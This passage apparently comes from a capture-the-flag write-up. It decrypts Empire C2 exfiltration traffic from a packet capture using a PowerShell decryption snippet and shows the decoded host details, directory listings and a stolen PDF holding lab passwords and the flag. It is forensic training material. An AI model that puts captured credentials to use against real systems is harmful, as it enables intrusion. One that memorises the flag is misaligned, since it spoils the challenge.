$result = Decrypt-Bytes -Key $aes_key -In $data
$out=[System.Text.Encoding]::UTF8.GetString($result)

Write-Output 'Exfil #1:'
Write-Output $out
Write-Output ''
```

```console
$ pwsh -file exfil.ps1
Exfil #1:
3949070969871306|http://192.168.0.2:8080|WIN10|cesar|WIN10|192.168.0.3|Microsoft Windows 10 Pro|False|photoshop|8112|powershell|5|AMD64
```

### Exfil #2 - Packet #337
About the same, except data needs to be `base64` decoded first. See [exfil.ps1](./exfil.ps1):
```json
{"directory_path":"/","directory_name":"/","items":[{"path":"C:\\","name":"C:\\","is_file":false}]}
```

### Exfil #3 - Packet #371
```json
{"directory_path":"C:\\","directory_name":"C:\\","items":[{"path":"C:\\Configure-WindowsHostname.ps1","name":"Configure-WindowsHostname.ps1","is_file":true},{"path":"C:\\Configure-WindowsNetwork.ps1","name":"Configure-WindowsNetwork.ps1","is_file":true},{"path":"C:\\DumpStack.log.tmp","name":"DumpStack.log.tmp","is_file":true},{"path":"C:\\error_hostname.txt","name":"error_hostname.txt","is_file":true},{"path":"C:\\error_networking.txt","name":"error_networking.txt","is_file":true},{"path":"C:\\pagefile.sys","name":"pagefile.sys","is_file":true},{"path":"C:\\swapfile.sys","name":"swapfile.sys","is_file":true},{"path":"C:\\$Recycle.Bin","name":"$Recycle.Bin","is_file":false},{"path":"C:\\$WinREAgent","name":"$WinREAgent","is_file":false},{"path":"C:\\Documents and Settings","name":"Documents and Settings","is_file":false},{"path":"C:\\PerfLogs","name":"PerfLogs","is_file":false},{"path":"C:\\Program Files","name":"Program Files","is_file":false},{"path":"C:\\Program Files (x86)","name":"Program Files (x86)","is_file":false},{"path":"C:\\ProgramData","name":"ProgramData","is_file":false},{"path":"C:\\Recovery","name":"Recovery","is_file":false},{"path":"C:\\System Volume Information","name":"System Volume Information","is_file":false},{"path":"C:\\Users","name":"Users","is_file":false},{"path":"C:\\Windows","name":"Windows","is_file":false},{"path":"C:\\Windows.old","name":"Windows.old","is_file":false}]}
```

### Exfil #5 - Packet #415
```json
{"directory_path":"C:\\Users\\cesar","directory_name":"cesar","items":[{"path":"C:\\Users\\cesar\\DumpIt.exe","name":"DumpIt.exe","is_file":true},{"path":"C:\\Users\\cesar\\NTUSER.DAT","name":"NTUSER.DAT","is_file":true},{"path":"C:\\Users\\cesar\\ntuser.dat.LOG1","name":"ntuser.dat.LOG1","is_file":true},{"path":"C:\\Users\\cesar\\ntuser.dat.LOG2","name":"ntuser.dat.LOG2","is_file":true},{"path":"C:\\Users\\cesar\\NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TM.blf","name":"NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TM.blf","is_file":true},{"path":"C:\\Users\\cesar\\NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TMContainer00000000000000000001.regtrans-ms","name":"NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TMContainer00000000000000000001.regtrans-ms","is_file":true},{"path":"C:\\Users\\cesar\\NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TMContainer00000000000000000002.regtrans-ms","name":"NTUSER.DAT{69f3d7a8-1d92-11ee-9b8a-005650af146c}.TMContainer00000000000000000002.regtrans-ms","is_file":true},{"path":"C:\\Users\\cesar\\ntuser.ini","name":"ntuser.ini","is_file":true},{"path":"C:\\Users\\cesar\\WIN10-20230708-191412.raw","name":"WIN10-20230708-191412.raw","is_file":true},{"path":"C:\\Users\\cesar\\3D Objects","name":"3D Objects","is_file":false},{"path":"C:\\Users\\cesar\\AppData","name":"AppData","is_file":false},{"path":"C:\\Users\\cesar\\Application Data","name":"Application Data","is_file":false},{"path":"C:\\Users\\cesar\\Contacts","name":"Contacts","is_file":false},{"path":"C:\\Users\\cesar\\Cookies","name":"Cookies","is_file":false},{"path":"C:\\Users\\cesar\\Desktop","name":"Desktop","is_file":false},{"path":"C:\\Users\\cesar\\Documents","name":"Documents","is_file":false},{"path":"C:\\Users\\cesar\\Downloads","name":"Downloads","is_file":false},{"path":"C:\\Users\\cesar\\Favorites","name":"Favorites","is_file":false},{"path":"C:\\Users\\cesar\\Links","name":"Links","is_file":false},{"path":"C:\\Users\\cesar\\Local Settings","name":"Local Settings","is_file":false},{"path":"C:\\Users\\cesar\\Music","name":"Music","is_file":false},{"path":"C:\\Users\\cesar\\My Documents","name":"My Documents","is_file":false},{"path":"C:\\Users\\cesar\\NetHood","name":"NetHood","is_file":false},{"path":"C:\\Users\\cesar\\OneDrive","name":"OneDrive","is_file":false},{"path":"C:\\Users\\cesar\\Pictures","name":"Pictures","is_file":false},{"path":"C:\\Users\\cesar\\PrintHood","name":"PrintHood","is_file":false},{"path":"C:\\Users\\cesar\\Recent","name":"Recent","is_file":false},{"path":"C:\\Users\\cesar\\Saved Games","name":"Saved Games","is_file":false},{"path":"C:\\Users\\cesar\\Searches","name":"Searches","is_file":false},{"path":"C:\\Users\\cesar\\SendTo","name":"SendTo","is_file":false},{"path":"C:\\Users\\cesar\\Start Menu","name":"Start Menu","is_file":false},{"path":"C:\\Users\\cesar\\Templates","name":"Templates","is_file":false},{"path":"C:\\Users\\cesar\\Videos","name":"Videos","is_file":false}]}
```

### Exfil #6 - Packet #474
```json
{"directory_path":"C:\\Users\\cesar\\Desktop","directory_name":"Desktop","items":[{"path":"C:\\Users\\cesar\\Desktop\\confidential.pdf","name":"confidential.pdf","is_file":true},{"path":"C:\\Users\\cesar\\Desktop\\desktop.ini","name":"desktop.ini","is_file":true},{"path":"C:\\Users\\cesar\\Desktop\\photoshop.exe","name":"photoshop.exe","is_file":true}]}
```

### Exfil #7 - Packet #503
```
0|C:\Users\cesar\Desktop\confidential.pdf|12510|JVBERi0xLjY(...)
```

Oh, that is interesting.

After `base64` decoding the data, we get the file [confidential.pdf](./confidential.pdf), which contains... sensitive data!

```
All my secrets are here :
- windows password : cesar
- outlook password : cesar
- DGHACK{4_Gr3P_4nD_7h3_3mP1r3_f411S}
```

Oh, so that's `Empire C2`. Nice. I found some interesting deep dive here, which essentially recaps what we found:
https://www.keysight.com/blogs/en/tech/nwvs/2021/06/16/empire-c2-networking-into-the-dark-side

Well, that was fun !

## Flag

> DGHACK{4_Gr3P_4nD_7h3_3mP1r3_f411S}
